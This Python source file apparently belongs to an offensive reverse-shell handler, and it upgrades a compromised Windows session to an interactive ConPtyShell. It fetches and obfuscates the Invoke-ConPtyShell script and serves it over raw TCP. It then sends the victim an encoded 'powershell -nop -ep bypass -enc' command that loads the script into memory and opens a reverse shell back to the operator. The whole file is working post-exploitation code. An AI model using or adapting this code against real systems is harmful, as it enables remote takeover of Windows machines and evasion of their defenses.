from __future__ import annotations

import base64
import shutil
import threading
import time
from typing import Callable, Dict, Optional

from koi.session import Session
from koi.utils.cache import cache_path, fetch_or_cache
from koi.utils.ps_obfuscate import obfuscate_conptyshell
from koi.utils.tcp import get_local_ip, spawn_send_server
from koi.utils.ui import Spinner, notify, bold, accent

_CONPTYSHELL_URL = (
    "https://raw.githubusercontent.com/antonioCoco/ConPtyShell"
    "/master/Invoke-ConPtyShell.ps1"
)

# Timeouts and delays
_TCP_SERVER_TIMEOUT = 60.0
_CONPTY_WAIT_TIMEOUT = 30.0
_CONPTY_INIT_SLEEP = 0.3
_CONPTY_POLL_SLEEP = 0.1


def _build_invoke_cmd(
    local_ip: str, tcp_port: int, callback_port: int, rows: int, cols: int, conpty_fn: str
) -> str:
    """Build ConPtyShell invoke command that fetches script via TCP (no HTTP)."""
    inner = (
        f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{tcp_port});"
        f"$_s=$_c.GetStream();"
        f"$_r=New-Object IO.StreamReader($_s);"
        f"$_script=$_r.ReadToEnd();"
        f"$_c.Close();"
        f". ([scriptblock]::Create($_script));"
        f"{conpty_fn} -RemoteIp {local_ip} -RemotePort {callback_port}"
        f" -Rows {rows} -Cols {cols} -CommandLine powershell"
    )
    encoded = base64.b64encode(inner.encode("utf-16-le")).decode()
    return f"powershell -nop -ep bypass -enc {encoded}"


_CONPTY_CACHE_NAME = "Invoke-ConPtyShell.ps1"


def upgrade_windows_conptyshell(
    sess: Session,
    sessions: Dict[int, Session],
    port: int,
    pending_conpty: dict,
    conpty_staging: dict,
    conpty_lock: threading.Lock,
    mask_ip: Callable[[str, str], str],
    logger=None,
) -> None:
    try:
        cols, rows = shutil.get_terminal_size()
    except Exception:
        cols, rows = 80, 24

    local_ip = sess.conn.getsockname()[0]
    if local_ip in ("0.0.0.0", ""):
        local_ip = get_local_ip(sess.addr[0])

    with Spinner("Fetching ConPtyShell..."):
        try:
            ps1_data, source = fetch_or_cache(_CONPTYSHELL_URL, _CONPTY_CACHE_NAME)
        except Exception as exc:
            notify('error', f"Failed to fetch ConPtyShell: {exc}")
            return

    if source == "cache":
        notify('warning', f"Network unavailable, using cached ConPtyShell ({cache_path(_CONPTY_CACHE_NAME)})")
    else:
        notify('info', "ConPtyShell fetched from remote")

    ps1_data, conpty_fn = obfuscate_conptyshell(ps1_data)

    tcp_port, thread, errors = spawn_send_server(ps1_data, timeout=_TCP_SERVER_TIMEOUT)
    notify('info', f"Serving ConPtyShell on TCP port {bold(tcp_port)}")

    invoke_cmd = _build_invoke_cmd(local_ip, tcp_port, port, rows, cols, conpty_fn)

    notify('info',
        f"Invoking ConPtyShell on session {accent(f'#{sess.id}')}, callback {bold(mask_ip(local_ip, 'local'))}:{bold(port)}"
    )

    if logger:
        logger.log_event("upgrade_start")

    pending_conpty[sess.addr[0]] = sess.os_type
    sess.send((invoke_cmd + "\r\n").encode(sess.encoding, errors="replace"))

    with Spinner("Waiting for ConPtyShell connection..."):
        new_sess = _wait_for_new_session(
            conpty_staging=conpty_staging,
            conpty_lock=conpty_lock,
            expected_ip=sess.addr[0],
            timeout=_CONPTY_WAIT_TIMEOUT,
        )

    if new_sess is None:
        notify('error', "ConPtyShell did not connect back in time.")
        return

    old_id = sess.id
    sess.close()
    sessions.pop(old_id, None)
    new_sess.id = old_id
    sessions[old_id] = new_sess

    new_sess.upgraded = True
    new_sess.is_conptyshell = True
    if logger:
        logger.log_event("upgrade_done")
        new_sess.attach_logger(logger)
    time.sleep(_CONPTY_INIT_SLEEP)
    new_sess.conn.sendall(b"\r\n")
    notify('success', f"Session {accent(f'#{old_id}')} upgraded to ConPtyShell.")


def _wait_for_new_session(
    conpty_staging: dict,
    conpty_lock: threading.Lock,
    expected_ip: str,
    timeout: float = 30.0,
) -> Optional[Session]:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        time.sleep(_CONPTY_POLL_SLEEP)
        with conpty_lock:
            if expected_ip in conpty_staging:
                return conpty_staging.pop(expected_ip)
    return None